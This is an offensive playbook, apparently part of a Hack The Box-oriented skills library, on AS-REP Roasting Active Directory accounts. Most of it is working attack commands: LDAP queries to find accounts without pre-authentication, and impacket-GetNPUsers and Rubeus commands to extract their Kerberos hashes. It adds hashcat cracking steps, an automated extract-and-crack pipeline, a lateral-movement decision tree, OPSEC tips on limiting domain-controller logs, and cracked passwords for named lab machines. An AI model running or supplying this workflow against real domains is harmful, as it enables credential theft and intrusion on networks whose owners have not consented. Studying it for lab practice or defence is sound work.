# AS-REP Roasting

> Extract a Kerberos hash for any AD user with `DONT_REQUIRE_PREAUTH`
> set. Crack offline.

## Objective
Obtain a crackable hash from an AD user without authenticating, by
abusing the Kerberos pre-authentication flag.

## When To Use
- AD detected (port 88 open).
- You have a username (or a list to spray).
- You don't have credentials yet *or* you want to expand laterally
  cheaply.

## Detection Indicators
- LDAP search for users with UAC flag `4194304`
  (`DONT_REQ_PREAUTH`) returns matches.
- Or you have *any* userlist; impacket-GetNPUsers will silently skip
  users with pre-auth required.

## Enumeration Strategy

### Find AS-REP candidates by LDAP

```bash
ldapsearch -x -H ldap://<ip> -b "DC=...,DC=..." \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

The numeric `4194304` is the bit mask for `DONT_REQ_PREAUTH`. The
syntax `1.2.840.113556.1.4.803` is the LDAP_MATCHING_RULE_BIT_AND OID.

### Or just spray a userlist

`impacket-GetNPUsers` skips invalid + pre-auth-required users without
erroring, so you can fire it against any list.

## Exploitation Workflow

```bash
# Single user
impacket-GetNPUsers <domain>/<user> -no-pass -dc-ip <ip>

# Userlist
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <ip> \
  -format hashcat -outputfile asrep.hashes

# Crack
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt -r best64.rule
```

## Commands

```bash
# Get the hash for one specific user
impacket-GetNPUsers htb.local/svc-alfresco -no-pass -dc-ip 10.10.10.161

# Output format flag matters:
-format hashcat   # John the Ripper / Hashcat both accept; preferred
-format john      # legacy

# When you get an error like "KDC_ERR_C_PRINCIPAL_UNKNOWN":
# the user does not exist on this DC. Re-check spelling and realm casing.

# When you get "KDC_ERR_PREAUTH_REQUIRED":
# the user exists but has pre-auth enabled (i.e., not vulnerable).
```

## Tool Usage

- **impacket-GetNPUsers** — the canonical tool. Available as both
  `GetNPUsers.py` (older) and `impacket-GetNPUsers` (Kali wrapper).
- **Rubeus** — Windows-side equivalent: `Rubeus.exe asreproast /format:hashcat`.

```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
```

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Wrong domain casing | `KDC_ERR_C_PRINCIPAL_UNKNOWN` even for real users | Use the exact realm string from `ldap-rootdse` |
| Forgetting `-no-pass` | Tool prompts for a password | Add the flag |
| Wrong hashcat mode | Empty crack output | `18200` for AS-REP (not 13100 — that's Kerberoast) |
| Cracking a non-AS-REP hash | Mode mismatch | Hash starts with `$krb5asrep$` |
| System clock skew | `KRB_AP_ERR_SKEW` | `sudo ntpdate <dc-ip>` |

## Decision-Making Logic

```
got userlist (even noisy / unvalidated)
  └─ run GetNPUsers → returns hashes for AS-REP-vulnerable users
       └─ found ≥1 hash:
            └─ hashcat -m 18200 with rockyou
                 ├─ cracked → use cred for SMB/WinRM/LDAP
                 └─ not cracked → expand wordlist or move on
       └─ found 0 hashes:
            └─ no AS-REP path; pivot to Kerberoast (need a cred first)
            └─ or pivot to spraying
```

## Pivot Opportunities
A cracked AS-REP cred enables:
- WinRM into the box.
- BloodHound enumeration with that user.
- Identifying *additional* attack edges (Kerberoast, ACL abuse).
- Potential autologon / Winlogon registry secrets on the box itself.

## OPSEC Considerations
- AS-REP requests log Kerberos event 4768 / 4625 on the DC.
- Cracking is silent (offline).
- Spraying with `GetNPUsers` over the entire userlist generates one
  log entry per user; throttle if needed.

## Real HTB Examples

- **Forest** — `svc-alfresco` is the AS-REP candidate; cracks to
  `s3rvice`.
- **Sauna** — `fsmith` discovered via Kerbrute, AS-REPed to
  `Thestrokes23`.
- **Mantis** — multiple service accounts AS-REPable.
- **Resolute** — different chain but same class of "pre-auth disabled
  for compatibility".

## Alternative Techniques

- **Kerberoasting** — works for accounts with SPN, requires creds, mode
  13100. Different attack class.
- **Bruteforcing krbtgt** — completely different attack against the
  KRBTGT account; not a typical CTF path.
- **Targeted Kerberoasting** — set an SPN on a target user (requires
  GenericWrite), then Kerberoast.

## Automation Opportunities

```bash
# A complete AS-REP-and-crack pipeline
impacket-GetNPUsers htb.local/ -usersfile users.txt -no-pass -dc-ip <ip> \
  -format hashcat -outputfile asrep.hashes
[ -s asrep.hashes ] && \
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --quiet
hashcat -m 18200 asrep.hashes --show
```

## Checklist

- [ ] Confirm AD via nmap (88+389)
- [ ] Acquire userlist (LDAP, RPC, kerbrute, web-scrape)
- [ ] `GetNPUsers -no-pass -dc-ip <ip>` against the list
- [ ] Hashcat mode `18200` against any returned hashes
- [ ] Use cracked creds for WinRM / SMB / BloodHound

## Related Skills

- [`active-directory/kerberoasting.md`](kerberoasting.md)
- [`active-directory/kerberos-username-enumeration.md`](kerberos-username-enumeration.md)
- [`active-directory/anonymous-ad-enumeration.md`](anonymous-ad-enumeration.md)
- [`tool-usage/impacket.md`](../tool-usage/impacket.md)
- [`tool-usage/hashcat.md`](../tool-usage/hashcat.md)
- [`methodology/07-ad-attack-chains.md`](../methodology/07-ad-attack-chains.md)
